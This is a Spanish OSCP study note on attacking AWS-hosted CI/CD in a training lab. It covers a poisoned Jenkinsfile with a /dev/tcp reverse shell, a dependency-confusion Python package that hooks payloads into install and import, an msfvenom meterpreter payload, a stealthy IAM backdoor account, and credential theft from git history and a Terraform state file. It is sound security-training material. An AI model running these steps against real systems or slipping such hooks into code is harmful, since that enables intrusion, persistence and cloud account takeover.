---
tipo: modulo
modulo: 26
estado: repasado
tags:
  - oscp
  - explotacion
  - cloud
  - aws
  - cicd
fecha: 2026-10-09
---

# 26 - Attacking AWS Cloud Infrastructure

> [!abstract] Resumen
> Ataques a sistemas **CI/CD** (Jenkins + Git + gestor de paquetes) desplegados sobre AWS, usando como marco el Top 10 de riesgos CI/CD de OWASP (flujo de control insuficiente, IAM inadecuado, abuso de cadena de dependencias, Poisoned Pipeline Execution, PBAC insuficiente, mala higiene de credenciales, configuración insegura, servicios de terceros sin gobernar, validación de integridad de artefactos deficiente, logging insuficiente). El módulo se divide en dos laboratorios encadenados:
> - **Leaked Secrets to Poisoned Pipeline** (26.3–26.6): enumerar Jenkins/Git/app → encontrar un bucket S3 mal configurado con el histórico git completo → recuperar credenciales de un commit antiguo (header de autenticación en base64) → usarlas para entrar al SCM → editar el `Jenkinsfile` de un repo (**Poisoned Pipeline Execution**) para obtener una reverse shell en el agente de build → desde ahí, abusar de las credenciales AWS inyectadas en el pipeline (`withAWS`) para enumerar permisos IAM y crear una **cuenta backdoor** con `AdministratorAccess`.
> - **Dependency Chain Abuse** (26.8–26.10): OSINT para encontrar el nombre de un paquete Python interno que falta en el índice privado → publicar un paquete malicioso con ese mismo nombre en el índice **público** (ataque de **dependency confusion**) con payload tanto en la instalación (`setup.py`/`cmdclass`) como en el runtime (`__getattr__`) → tras obtener shell en el contenedor de producción, pivotar con un **proxy SOCKS de Meterpreter** para escanear la red interna → encontrar un segundo Jenkins con un plugin vulnerable (**S3 Explorer**) que filtra claves AWS en el HTML → usar esas claves para localizar un bucket con el **state file de Terraform**, que expone credenciales de un user con `AdministratorAccess` → escalar a administrador completo de la cuenta.
> Idea clave del examen: en CI/CD, el objetivo no es solo "hackear la app" sino encontrar **dónde vive un secreto** (historial de git, variables de entorno del pipeline, un plugin con bug conocido, un state file de IaC) y **qué puede ejecutar código** por nosotros (un `Jenkinsfile` editable, un paquete que el gestor de dependencias va a instalar).

## Conceptos clave
- **CI/CD como superficie de ataque**: los pipelines necesitan acceso al código fuente, a secretos y a los entornos de despliegue — comprometer el pipeline (no la app final) suele dar el camino más corto a credenciales cloud con privilegios amplios.
- **Poisoned Pipeline Execution (PPE)**: si un atacante puede modificar el fichero que define el pipeline (`Jenkinsfile`, `.gitlab-ci.yml`, etc.) y el sistema de automatización confía en ese repo, cualquier cambio en el fichero se traduce en ejecución de comandos arbitraria cuando el pipeline se dispara (ej. por un `git push` con webhook configurado).
- **Jenkinsfile / Groovy DSL**: el `Jenkinsfile` usa una DSL basada en Groovy. El bloque `script{}` permite Groovy pero con acceso restringido a APIs internas (sandbox); para ejecutar comandos de sistema de forma fiable se usa el step `sh` (Linux) — comprobando `isUnix()` para no romper el pipeline si el agente fuera Windows — en vez de intentar acceder a APIs internas vía Groovy puro.
- **`withAWS` (plugin AWS Steps)**: step de un plugin de Jenkins que inyecta credenciales AWS (access key/secret/región) como variables de entorno dentro de un bloque del pipeline — si logramos ejecutar código dentro de ese bloque, heredamos esas credenciales.
- **Secretos en el historial de Git**: borrar una línea con `git rm`/editar un fichero no elimina el secreto del **historial** — sigue accesible vía `git log` + `git show <hash>`. Herramientas como `gitleaks` automatizan la búsqueda, pero no sustituyen una revisión manual del log (en este módulo, `gitleaks detect` no encontró nada y la revisión manual sí).
- **Dependency confusion (abuso de cadena de dependencias)**: cuando un gestor de paquetes (pip, npm, etc.) está configurado para buscar en un índice privado **y además** en el público (`extra-index-url`), y el paquete interno no existe en el público, un atacante puede publicar un paquete con el mismo nombre en el índice público. Si su versión es más alta que la esperada por el *version specifier* del proyectoobjetivo (ej. `~=1.1.0` acepta cualquier `1.1.x`), el gestor de paquetes puede preferir/descargar la versión maliciosa pública en vez de (o además de) la interna.
- **Ejecución de payload en un paquete Python malicioso**: dos puntos de enganche principales — (1) durante la **instalación**, sobreescribiendo el comando `install` de `setuptools` vía `cmdclass={'install': MiClaseInstall}`; (2) durante el **runtime/import**, usando `__getattr__` a nivel de módulo para interceptar cualquier llamada a una función del paquete que no exista literalmente, de forma que el payload se ejecute sin necesidad de saber los nombres exactos que usará la víctima.
- **Pivoting con proxy SOCKS de Meterpreter**: `use auxiliary/server/socks_proxy` + `run -j` levanta un proxy SOCKS en Metasploit; `route add <red> <máscara> <id_sesión>` enruta el tráfico de esa red a través de la sesión Meterpreter; un túnel SSH local (`ssh -fN -L localhost:1080:localhost:1080 <kali_nube>`) expone ese proxy en la Kali personal, permitiendo configurar el navegador (o `proxychains`) para alcanzar redes internas solo visibles desde el host comprometido.
- **Plugins de Jenkins vulnerables**: un plugin desactualizado (ej. S3 Explorer, basado en una app JS que incrusta credenciales AWS directamente en el HTML/JS servido al cliente) puede filtrar secretos simplemente mirando el "View Source" de la página — sin necesidad de ningún exploit activo.
- **Terraform state file (`terraform.tfstate`)**: fichero JSON que Terraform usa para trackear el estado de la infraestructura gestionada; con frecuencia contiene **en texto plano** atributos sensibles de los recursos que creó (claves de acceso IAM, contraseñas, ARNs, políticas asociadas a cada user). Si el bucket S3 que lo almacena es accesible, es un objetivo de alto valor.
- **Enumeración de permisos de una credencial robada**: `sts get-caller-identity` confirma validez + ARN/cuenta; `iam list-user-policies`/`list-attached-user-policies`/`list-groups-for-user` listan el origen de los permisos; si el propio user no tiene permiso para listar sus políticas, hay que inferir el alcance probando acciones directamente (fuerza bruta de permisos) en vez de listarlas.
- **Backdoor account vs. reutilizar la cuenta comprometida**: en vez de operar con el user ya comprometido (que puede rotar sus credenciales o ser detectado), conviene crear un user nuevo (`iam create-user` + `iam attach-user-policy` + `iam create-access-key`) con un nombre que pase desapercibido (ej. imitando convenciones de nombrado legítimas tipo `terraform-admin`), consiguiendo así un acceso administrador persistente y propio.

> [!tip] Idea para el examen
> Flujo recomendado: enumerar los tres componentes del stack CI/CD (SCM, automation server, app) → buscar object storage (buckets S3) referenciado en el HTML/JS de la app → si el bucket es listable (directamente o con credenciales propias), descargarlo entero y tratarlo como un repo git — revisar `git log`/`git show`, no solo el estado actual → con credenciales de SCM, buscar `Jenkinsfile`s editables y webhooks que disparen el pipeline al hacer push (**PPE**) → desde el agente/builder comprometido, `env | grep AWS` para credenciales inyectadas por el pipeline → enumerar permisos IAM de esas credenciales y, si son admin, crear un backdoor. Si el vector es cadena de dependencias: buscar el nombre exacto del paquete que falta (foros, mensajes de error) y el *version specifier* exacto, igualar o superar esa versión en un paquete propio con el mismo nombre, poner payload tanto en install como en runtime, y publicarlo donde el objetivo lo vaya a resolver.

---

## 26.3–26.4 Enumeración y descubrimiento de secretos (Leaked Secrets to Poisoned Pipeline)

```bash
# Enumeración de Jenkins con Metasploit
sudo msfdb init
msfconsole --quiet
use auxiliary/scanner/http/jenkins_enum
set RHOSTS <automation.objetivo>
set TARGETURI /
run
```
```bash
# Enumeración de la app: buscar referencias a S3 en el código fuente (View Page Source)
curl https://<bucket>.s3.<region>.amazonaws.com          # probar acceso directo
head -n 51 /usr/share/wordlists/dirb/common.txt > first50.txt
dirb https://<bucket>.s3.<region>.amazonaws.com ./first50.txt    # fuerza bruta de objetos del bucket
```
```bash
# Si el bucket no es listable por HTTP anónimo, probar con credenciales IAM propias/del lab
aws configure                             # region = la del bucket
aws s3 ls <bucket>                          # listar con credenciales autenticadas (AuthenticatedUsers)
```
| Flag / parte | Qué hace |
|---|---|
| `TARGETURI /` | ruta base donde está montado Jenkins (puede no ser `/jenkins/`) |
| `dirb <url> ./first50.txt` | fuerza bruta reducida (solo primeras 51 palabras) para no tardar demasiado contra un bucket S3 |

### Descargar el bucket y buscar secretos en el historial de Git
```bash
aws s3 cp s3://<bucket>/README.md ./                 # descargar un fichero suelto
aws s3 sync s3://<bucket> ./static_content/            # descargar el bucket completo (incluye .git/)
cd static_content
sudo apt install -y gitleaks
gitleaks detect                                           # búsqueda automática de secretos (puede no encontrar nada)
git log                                                     # revisión manual del historial, commit a commit
git show <hash_commit>                                       # diff del commit — buscar secretos eliminados
echo "<header_base64>" | base64 --decode                      # ej. decodificar un header Authorization: Basic
```
| Flag / parte | Qué hace |
|---|---|
| `aws s3 sync` | descarga recursiva del bucket completo a un directorio local, preservando estructura — incluye carpetas "ocultas" como `.git/` si están en el bucket |
| `git show <hash>` | muestra el diff exacto de un commit — útil para ver qué se **eliminó** (ej. una credencial hardcodeada) aunque ya no esté en el HEAD actual |

> [!warning] Que `gitleaks detect` no encuentre nada no significa que no haya secretos — siempre complementar con revisión manual de `git log`/`git show`, sobre todo en commits con mensajes tipo "Fix issue" o "remove credentials".

---

## 26.5 Poisoning the pipeline (PPE)

```groovy
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                withAWS(region: 'us-east-1', credentials: 'aws_key') {
                    script {
                        if (isUnix()) {
                            sh 'bash -c "bash -i >& /dev/tcp/<IP_kali>/<puerto> 0>&1" & '
                        }
                    }
                }
            }
        }
    }
}
```
| Flag / parte | Qué hace |
|---|---|
| `withAWS(region:..., credentials:'aws_key')` | step del plugin AWS Steps — inyecta las credenciales AWS configuradas en Jenkins como variables de entorno dentro del bloque |
| `isUnix()` | evita que el pipeline falle si el agente resulta ser Windows en vez de Linux |
| `sh '... & '` | ejecuta el comando en segundo plano para no bloquear el pipeline a la espera de que la reverse shell termine |

```bash
# En Kali: preparar listener antes de hacer el commit/push que dispara el webhook
sudo systemctl start apache2                      # prueba inicial de ejecución con curl
nc -nvlp <puerto>                                    # listener para la reverse shell real
```

> [!tip] Antes de lanzar directamente una reverse shell, conviene probar con algo inofensivo (`curl http://<IP_kali>/`) y confirmar en los logs (`/var/log/apache2/access.log`) que el pipeline realmente ejecuta nuestro código, antes de arriesgar el payload final.

Editar el `Jenkinsfile` desde el SCM (con las credenciales robadas) y hacer commit/push dispara automáticamente el pipeline vía el **webhook** configurado (visible en Settings → Webhooks del repo), sin necesidad de acceso directo a Jenkins.

Ver nota → [[Poisoned Pipeline Execution (Jenkinsfile)]].

---

## 26.6 Compromising the environment via backdoor account

```bash
aws configure --profile CompromisedJenkins              # credenciales obtenidas en el agente (env | grep AWS)
aws --profile CompromisedJenkins sts get-caller-identity   # username, Account ID, ARN
aws --profile CompromisedJenkins iam list-user-policies --user-name <user>
aws --profile CompromisedJenkins iam list-attached-user-policies --user-name <user>
aws --profile CompromisedJenkins iam list-groups-for-user --user-name <user>
aws --profile CompromisedJenkins iam get-user-policy --user-name <user> --policy-name <policy>
```
```bash
# Si la política es "Action":"*" / "Resource":"*" -> administrador. Crear backdoor:
aws --profile CompromisedJenkins iam create-user --user-name <nombre_discreto>
aws --profile CompromisedJenkins iam attach-user-policy --user-name <nombre_discreto> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws --profile CompromisedJenkins iam create-access-key --user-name <nombre_discreto>
aws configure --profile=<nombre_discreto>                 # guardar las nuevas credenciales de acceso persistente
```
| Flag / parte | Qué hace |
|---|---|
| `iam create-user` + `attach-user-policy` + `create-access-key` | cadena mínima para crear un acceso administrador propio y persistente, independiente de las credenciales originalmente comprometidas |

> [!tip] En un engagement real, el nombre del backdoor debe imitar la convención de nombrado legítima del cliente (ej. `terraform-admin`) para no destacar en una auditoría de IAM.

---

## 26.8–26.9 Information gathering y Dependency Chain Attack

```bash
pip download <paquete_sospechoso>              # comprobar si el paquete existe en el índice público
```
Estructura mínima de un paquete Python malicioso:
```
hackshort-util/
├── setup.py
└── hackshort_util/
    ├── __init__.py
    └── utils.py
```
```python
# setup.py — payload durante la instalación
from setuptools import setup, find_packages
from setuptools.command.install import install

class Installer(install):
    def run(self):
        install.run(self)
        # payload aquí (ej. escribir un fichero, o directamente el comando de exfiltración/shell)

setup(
    name='hackshort-util',
    version='1.1.4',                 # debe superar el version specifier del objetivo (ej. ~=1.1.0)
    packages=find_packages(),
    cmdclass={'install': Installer},
)
```
```python
# hackshort_util/utils.py — payload en runtime, sin necesidad de conocer los nombres de función exactos
import sys

def standardFunction():
    pass

def __getattr__(name):
    standardFunction()
    # payload aquí: se ejecuta con CUALQUIER función llamada desde el paquete (utils.loquesea())

def exception_hook(exc_type, exc_value, exc_tb):
    pass

sys.excepthook = exception_hook
```
```bash
python3 ./setup.py sdist                              # construir el source distribution
pip install ./dist/<paquete>-<version>.tar.gz           # probar instalación local antes de publicar
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<IP_kali> LPORT=<puerto>    # generar payload Python
```
Publicar en el índice que el objetivo resolverá (ej. réplica/mirror interno accesible, o directamente el público si el objetivo usa `extra-index-url`):
```bash
nano ~/.pypirc                                           # [distutils] index-servers = <repo> + url/user/pass
python3 setup.py sdist upload -r <repo>
```
| Flag / parte | Qué hace |
|---|---|
| `__getattr__(name)` a nivel de módulo | intercepta cualquier atributo/función no definida explícitamente — permite ejecutar el payload sin adivinar qué función concreta usará la víctima |
| `cmdclass={'install': Installer}` | hook oficial de `setuptools` para ejecutar código propio durante `pip install`, además del proceso normal de instalación |
| `sys.excepthook` | red de seguridad: si el payload/código personalizado lanza una excepción inesperada, evita que se propague de forma visible y rompa el flujo normal del programa objetivo |

Ver nota → [[Ataque de Cadena de Dependencias (Dependency Confusion)]].

---

## 26.10 Compromising the environment (segundo Jenkins + Terraform state)

```bash
# Enumeración básica del contenedor tras la reverse shell del paquete malicioso
uname -a ; cat /etc/os-release
cat /proc/mounts | grep docker                 # confirmar que es un contenedor
cat /proc/1/status | grep Cap                    # capabilities del proceso 1
capsh --decode=<valor_hex>                          # decodificar capabilities (buscar cap_sys_admin/cap_net_admin)
env | grep AWS                                        # credenciales AWS inyectadas en el entorno del contenedor
```
```bash
# Script propio de escaneo de puertos (sin herramientas de escaneo instaladas en el contenedor)
python3 netscan.py <rango_cidr>                    # ej. escanear 172.x.0.1/24 en busca de puertos 80/443/8080
```
```bash
# Pivoting: proxy SOCKS de Meterpreter + ruta + túnel SSH local
# dentro de Metasploit:
use auxiliary/server/socks_proxy
run -j
sessions                                 # obtener el ID de sesión meterpreter activa
route add <red_objetivo> <mascara> <id_sesion>
```
```bash
ssh -fN -L localhost:1080:localhost:1080 <usuario>@<IP_kali_nube>     # exponer el proxy SOCKS en la Kali personal
```
Configurar el proxy SOCKS v5 (`127.0.0.1:1080`) en el navegador (o `proxychains`) para alcanzar la red interna descubierta.

```bash
# Tras encontrar un segundo Jenkins con self-registration abierto y un plugin vulnerable (ej. S3 Explorer):
# "View Source" de la página del plugin -> buscar credenciales AWS hardcodeadas en inputs hidden del HTML/JS
```
```bash
aws configure --profile=stolen-s3                    # credenciales filtradas por el plugin
aws --profile=stolen-s3 sts get-caller-identity
aws --profile=stolen-s3 s3 ls <bucket_descubierto>
aws --profile=stolen-s3 s3api list-buckets               # listar TODOS los buckets accesibles con esa credencial
```
```bash
# Localizar y leer el Terraform state file
aws --profile=stolen-s3 s3 ls tf-state-<sufijo>
aws --profile=stolen-s3 s3 cp s3://tf-state-<sufijo>/terraform.tfstate ./
cat terraform.tfstate | less                              # revisar "users"/"resources" -> IDs y secrets en texto plano
```
```bash
# Con las credenciales de un user con AdministratorAccess encontradas en el state file:
aws configure --profile=<nombre_admin>
aws --profile=<nombre_admin> iam list-attached-user-policies --user-name <nombre_admin>   # confirmar AdministratorAccess
```
| Flag / parte | Qué hace |
|---|---|
| `route add <red> <mascara> <id_sesion>` | en Metasploit, enruta el tráfico destinado a esa red a través de la sesión Meterpreter indicada |
| `s3api list-buckets` | a diferencia de `s3 ls` (que lista objetos de UN bucket), lista **todos** los buckets accesibles por la credencial — útil para descubrir buckets no referenciados en ningún sitio público |
| Terraform state file | guarda en texto plano los atributos de los recursos que gestionó, incluidas claves de acceso IAM creadas por ese mismo Terraform |

Ver notas → [[Pivoting con Meterpreter SOCKS Proxy]] · [[Terraform State File Secrets]].

---

> [!warning] Errores comunes / cosas que fallan
> - Confiar solo en herramientas automáticas (`gitleaks`) para buscar secretos en git — revisar siempre el `git log`/`git show` a mano.
> - Olvidar que borrar un secreto de un fichero no lo borra del **historial** de git.
> - En el `Jenkinsfile`, intentar ejecutar comandos de sistema directamente en Groovy dentro de `script{}` en vez de usar `sh` — Groovy en Jenkins corre en un sandbox con acceso restringido a APIs internas.
> - No comprobar `isUnix()` antes de usar `sh` — el pipeline puede fallar si el agente no es Linux.
> - Publicar el paquete malicioso con una versión que NO satisface el *version specifier* exacto del objetivo (ej. publicar 2.0.0 cuando el proyecto fija `~=1.1.0`) — el gestor de paquetes simplemente no lo instalará.
> - No wrappear el payload en el import (`__getattr__`) y asumir que basta con poner código en `setup.py` — si el objetivo solo importa el paquete pero no lo reinstala (ya lo tiene cacheado/instalado), el payload de instalación nunca se ejecuta.
> - Depender de una única sesión Meterpreter sin volver a comprobar `sessions -i` — los contenedores objetivo pueden morir/reiniciarse durante la enumeración.
> - Dar por hecho que un plugin de terceros (ej. S3 Explorer) es seguro solo porque está instalado en un Jenkins "de producción" — revisar siempre avisos/CVEs conocidos del plugin.
> - No revisar el Terraform state file completo: puede contener credenciales de **varios** users con distintos niveles de privilegio — buscar siempre el que tenga `AdministratorAccess`.

## Ejemplo práctico
> [!example] Cadena completa del módulo (dos laboratorios)
> **Lab 1 — Leaked Secrets to Poisoned Pipeline:**
> 1. Enumerar Jenkins (Metasploit `jenkins_enum`, bloqueado por auth), Git server (Gitea, 5 users expuestos en `/explore/users`) y la app (HTML source revela URLs de un bucket S3).
> 2. El bucket no es listable por `curl` anónimo, pero sí con credenciales IAM propias del lab (`aws s3 ls`) → se descarga entero con `aws s3 sync` (incluye `.git/`).
> 3. `gitleaks detect` no encuentra nada; `git log` + `git show` sí: un commit antiguo tenía un header `Authorization: Basic` hardcodeado → decodificado da credenciales de `administrator` en el Gitea.
> 4. Con esas credenciales, se revisa un `Jenkinsfile` (`image-transform`) que usa `withAWS` con credenciales con permisos para desplegar una CloudFormation con una Lambda → se edita el `Jenkinsfile` para añadir una reverse shell (`withAWS` + `script{ if(isUnix()){ sh '...' } }`) → el webhook del repo dispara el pipeline al hacer push → shell en el builder de Jenkins.
> 5. `env | grep AWS` en el builder revela credenciales AWS inyectadas por el pipeline → `sts get-caller-identity` + `iam get-user-policy` confirman `"Action":"*"`/`"Resource":"*"` (admin) → se crea un user backdoor con `AdministratorAccess` y su propia access key.
>
> **Lab 2 — Dependency Chain Abuse:**
> 6. La app (`HackShort`, acortador de URLs) usa una API documentada; un forum post de OSINT revela que un desarrollador no puede instalar `hackshort-util~=1.1.0` (falta en el índice interno) y pega el `from hackshort_util import utils`.
> 7. Se crea un paquete malicioso `hackshort-util` versión `1.1.4` con payload en `setup.py` (install) y en `utils.py` (`__getattr__`, runtime) + un payload Meterpreter generado con `msfvenom`, y se publica en el índice que la build resuelve (`pypi.offseclab.io`) → ~10 minutos después, el rebuild automático de producción da una sesión Meterpreter.
> 8. Desde el contenedor de producción (`root`, pero aislado en Docker), se transfiere un script propio de escaneo de puertos (`netscan.py`) y se descubren dos redes internas (172.18.0.1/16, 172.30.0.1/16) → se pivota con un proxy SOCKS de Meterpreter + túnel SSH local hacia la Kali personal.
> 9. Se descubre un segundo Jenkins con self-registration abierto en la red interna; un plugin desactualizado (S3 Explorer) expone claves AWS en el HTML (`View Source`) de un proyecto llamado `company-dir`.
> 10. Con esas claves, `s3api list-buckets` revela un bucket `tf-state-*` → se descarga `terraform.tfstate` → contiene varios users con sus `AccessKeyId`/`SecretAccessKey` en claro, uno de ellos (`Goran.B`) con `AdministratorAccess` → configurando esas credenciales se obtiene control total de la cuenta AWS.

## Relacionado
- Técnicas: [[Poisoned Pipeline Execution (Jenkinsfile)]] · [[Ataque de Cadena de Dependencias (Dependency Confusion)]] · [[Pivoting con Meterpreter SOCKS Proxy]] · [[Terraform State File Secrets]]
- Cheatsheet: [[CICD y Supply Chain]] · [[AWS]]
- Módulo previo: [[25 - Enumerating AWS Cloud Infrastructure]]
- Relacionado: [[Metasploit]] (módulos auxiliary/handler, proxy SOCKS), [[Enumeracion de Buckets S3]] (módulo 25)
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - Repasar otros plugins de Jenkins con histórico de CVEs conocidos (más allá de S3 Explorer) para tener un catálogo mental más amplio.
> - Profundizar en cómo detectar `extra-index-url` vs `index-url` en una configuración de pip real sin acceso directo al fichero de config, para saber de antemano si un dependency confusion es viable.
> - Repasar otras formas de hook de ejecución en paquetes npm/otros gestores, por si el examen usa un lenguaje distinto a Python para este vector.
